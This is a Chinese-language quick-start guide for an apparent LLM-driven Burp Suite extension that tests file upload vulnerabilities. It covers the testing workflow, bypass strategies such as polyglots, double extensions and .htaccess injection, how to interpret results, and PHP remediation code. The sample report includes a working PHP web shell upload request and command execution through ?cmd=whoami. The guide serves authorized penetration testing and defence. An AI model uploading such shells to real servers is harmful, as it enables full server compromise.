# File Upload Vulnerability Testing - Quick Start Guide

本指南专门介绍如何使用 BurpAI Agent 测试文件上传漏洞。

## 前置条件

1. 已安装 Burp Suite Professional
2. 已配置 BurpAI Agent 和有效的 LLM API Key
3. 拥有测试目标的合法授权

## 快速开始

### 步骤 1: 识别文件上传端点

1. 使用 Burp Proxy 浏览目标应用
2. 寻找文件上传功能（头像上传、文档上传、媒体上传等）
3. 在 Proxy 中捕获文件上传请求

### 步骤 2: 在 Repeater 中打开请求

1. 在 Proxy History 中右键点击文件上传请求
2. 选择 "Send to Repeater"
3. 切换到 Repeater 标签页

### 步骤 3: 启动文件上传分析

1. 在 Repeater 中右键点击请求
2. 选择 `BurpAI Agent` → `File Upload Analysis`

### 步骤 4: 监控分析过程

切换到 `BurpAI Dashboard` 标签页，你会看到：

```
🟢 AI Thought: "The request contains a file upload parameter 'avatar'. 
I will test for arbitrary file upload vulnerability starting with basic PHP web shell."

🔵 System Action: "Sending modified request: Type: file_upload, 
Parameter: file, Payload: Generated #1 - Basic PHP Web Shell"

🟠 Observation: "Status: 200, Time: 234ms, Length: 1024"

🟢 AI Thought: "File uploaded successfully. Now testing if the uploaded 
file is accessible and executable."

... (continues with different payload types)
```

### 步骤 5: 查看最终结果

如果检测到漏洞，你会看到：

```
🔴 VULNERABILITY FOUND: Arbitrary File Upload (High)

Evidence: 
1. Successfully uploaded shell.php with image/jpeg MIME type
2. File is accessible at: /uploads/shell.php
3. Command execution confirmed: ?cmd=whoami returned 'www-data'

Remediation:
- Implement strict file type validation (magic bytes, not just extension)
- Validate file contents, not just headers
- Rename uploaded files with random names
- Store uploaded files outside web root
- Execute files only from trusted directories
```

## 高级用法

### 自定义文件参数名

如果文件上传使用非标准参数名，AI Agent 会自动检测。你也可以在 Custom Prompt 中指定：

```
Test the file upload parameter named 'profile_picture' specifically.
Focus on bypassing the image validation.
```

### 特定 Payload 类型

要求 AI 测试特定类型的绕过：

```
Focus only on .htaccess attacks and web.config injection.
Do not test web shells.
```

### 限制迭代次数

在配置面板中设置 `Max Iterations`，例如设为 3 可以快速完成测试。

### 提高置信度

将 `Confidence Level` 设置为 `High` 可以减少误报，但可能漏报某些漏洞。

## 常见场景

### 场景 1: 图片上传（头像）

**测试重点：**
- Magic Header 注入
- Polyglot 文件
- MIME 类型欺骗
- 双扩展名

**AI 检测策略：**
```
1. Test GIF89a + PHP
2. Test JPEG magic bytes + PHP
3. Test polyglot GIF + PHP
4. Test double extensions: avatar.php.jpg
5. Verify if uploaded file is accessible
6. Test command execution if file is accessible
```

### 场景 2: 文档上传（PDF/DOC）

**测试重点：**
- Web Shell with .doc/.pdf extension
- XXE via XML uploads
- Archive exploits (zip/tar)

**AI 检测策略：**
```
1. Test PHP shell with .doc extension
2. Test PHP shell with .pdf extension
3. Test XXE payload in .xml file
4. Test ZIP archive with embedded shell
5. Check for document parsing vulnerabilities
```

### 场景 3: 多媒体上传（视频/音频）

**测试重点：**
- Large file DoS
- Archive exploitation
- Magic header injection (MP4, MP3 headers)

**AI 检测策略：**
```
1. Test large file (10MB) for DoS
2. Test ZIP with .mp4 extension
3. Test magic bytes injection
4. Check memory exhaustion vulnerabilities
```

### 场景 4: 配置文件上传

**测试重点：**
- .htaccess upload
- web.config upload
- .user.ini upload

**AI 检测策略：**
```
1. Upload .htaccess to force .jpg execution as PHP
2. Upload web.config for IIS
3. Upload .user.ini for PHP-FPM
4. Test if configuration takes effect
5. Upload actual shell after config injection
```

## 结果解读

### 成功上传的特征

AI Agent 会检查以下指标：

1. **HTTP 状态码**
   - 200 OK - 上传成功
   - 201 Created - 上传成功（RESTful API）
   - 403 Forbidden - 拒绝上传（可能有防护）
   - 422 Unprocessable Entity - 验证失败

2. **响应内容**
   - 包含文件路径/URL
   - 包含上传成功消息
   - 包含文件 ID 或名称

3. **文件可访问性**
   - AI 尝试访问上传的文件
   - 检测是否返回文件内容

4. **代码执行**
   - 通过 `?cmd=whoami` 等测试命令执行
   - 检测响应中的命令输出

### 漏洞严重性评级

- **Critical**: Web Shell 上传成功且可以执行命令
- **High**: 任意文件上传成功，可以绕过文件类型验证
- **Medium**: 文件名可操纵，可能导致路径遍历
- **Low**: MIME 类型验证可绕过，但文件内容仍被验证

## 误报处理

### 常见误报场景

1. **文件上传但无法访问**
   - 上传成功但文件不在可访问位置
   - 需要认证才能访问上传的文件

2. **MIME 类型绕过但内容验证**
   - 成功绕过 MIME 检查
   - 但后端验证了实际文件内容

3. **Web Shell 上传但无法执行**
   - 文件上传到非执行目录
   - Web 服务器配置正确（.php 不在上传目录执行）

### 减少误报

1. 设置 `Confidence Level` 为 `High`
2. 在 Custom Prompt 中要求更严格的证据：
   ```
   Only report vulnerability if you can successfully execute a command
   using ?cmd=whoami and verify the output.
   ```

3. 增加 `Max Iterations` 以进行更全面的验证

## 防御建议

检测到文件上传漏洞后，建议以下防御措施：

### 1. 文件类型验证

```php
// 错误示例：只检查扩展名
$allowed = ['jpg', 'png', 'gif'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (in_array($ext, $allowed)) {
    move_uploaded_file(...); // 不安全！
}

// 正确示例：验证实际文件内容
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['file']['tmp_name']);
$allowed = ['image/jpeg', 'image/png', 'image/gif'];
if (in_array($mime, $allowed)) {
    move_uploaded_file(...);
}
```

### 2. 文件内容验证

```php
// 验证图片尺寸
$imageInfo = getimagesize($_FILES['file']['tmp_name']);
if ($imageInfo === false) {
    die('Invalid image');
}
```

### 3. 重命名上传的文件

```php
// 生成随机文件名
$newName = uniqid() . '_' . bin2hex(random_bytes(8)) . '.jpg';
move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $newName);
```

### 4. 存储在 web root 之外

```php
// 存储在不可访问的目录
move_uploaded_file($_FILES['file']['tmp_name'], '/var/uploads/' . $newName);

// 通过 PHP 文件提供下载
header('Content-Type: image/jpeg');
readfile('/var/uploads/' . $newName);
```

### 5. 限制文件大小

```php
// 限制为 5MB
if ($_FILES['file']['size'] > 5 * 1024 * 1024) {
    die('File too large');
}
```

### 6. 禁用上传目录的执行权限

```
# Apache .htaccess
<Directory /path/to/uploads>
    Options -ExecCGI
    <FilesMatch "\.(php|phtml|php5|php7)$">
        Order allow,deny
        Deny from all
    </FilesMatch>
</Directory>
```

## 故障排查

### 问题: AI 一直在测试相同类型的 payload

**解决方案**: 检查是否有网络问题，或 API Key 是否有效

### 问题: Dashboard 没有显示新消息

**解决方案**: 切换到其他标签页后再切回 Dashboard

### 问题: "Connection test failed" 错误

**解决方案**:
1. 检查 API Key 是否正确
2. 检查 Base URL 是否正确
3. 检查网络连接
4. 确认 API 配额未耗尽

### 问题: 漏洞被遗漏

**解决方案**:
1. 增加 Max Iterations
2. 降低 Confidence Level
3. 使用 Custom Prompt 提供更多上下文
4. 手动确认目标确实存在漏洞

## 示例报告

完整的漏洞报告示例：

```markdown
# File Upload Vulnerability Report

## Target
- URL: https://example.com/api/upload
- Parameter: avatar
- Upload Endpoint: /uploads/

## Vulnerability Details
- **Type**: Arbitrary File Upload with Web Shell Execution
- **Severity**: Critical
- **CVSS Score**: 9.8 (Critical)

## Proof of Concept

### Step 1: Upload Web Shell
```
POST /api/upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

GIF89a<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

### Step 2: Access Uploaded File
```
GET /uploads/shell.php HTTP/1.1
Host: example.com
Response: 200 OK
```

### Step 3: Execute Command
```
GET /uploads/shell.php?cmd=whoami HTTP/1.1
Host: example.com
Response: www-data
```

## Impact
- Full server compromise
- Access to sensitive data
- Ability to pivot to internal network
- Persistent backdoor

## Remediation
1. Implement strict file type validation (magic bytes)
2. Validate file contents, not just headers
3. Rename uploaded files with random names
4. Store uploaded files outside web root
5. Disable script execution in upload directory
6. Implement file content sanitization
```

## 进阶技巧

### 组合攻击

某些场景需要组合多个漏洞：

```
1. Upload .htaccess to force .jpg execution
2. Upload shell.jpg with PHP code
3. Access shell.jpg which now executes as PHP
```

### 时间盲注

如果文件上传不会显示路径：

```
1. Upload shell with sleep() function
2. Try to access common paths: /uploads/shell.php, /files/shell.php, etc.
3. Measure response time to detect execution
```

### 条件竞争上传

某些应用在上传前会检查文件，但在检查和移动之间存在竞争条件。

## 参考资料

- [OWASP File Upload Testing](https://owasp.org/www-community/attacks/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [PHP File Upload Security](https://www.php.net/manual/en/features.file-upload.security.php)
- 完整 payload 文档: [FILE_UPLOAD_PAYLOADS.md](./FILE_UPLOAD_PAYLOADS.md)
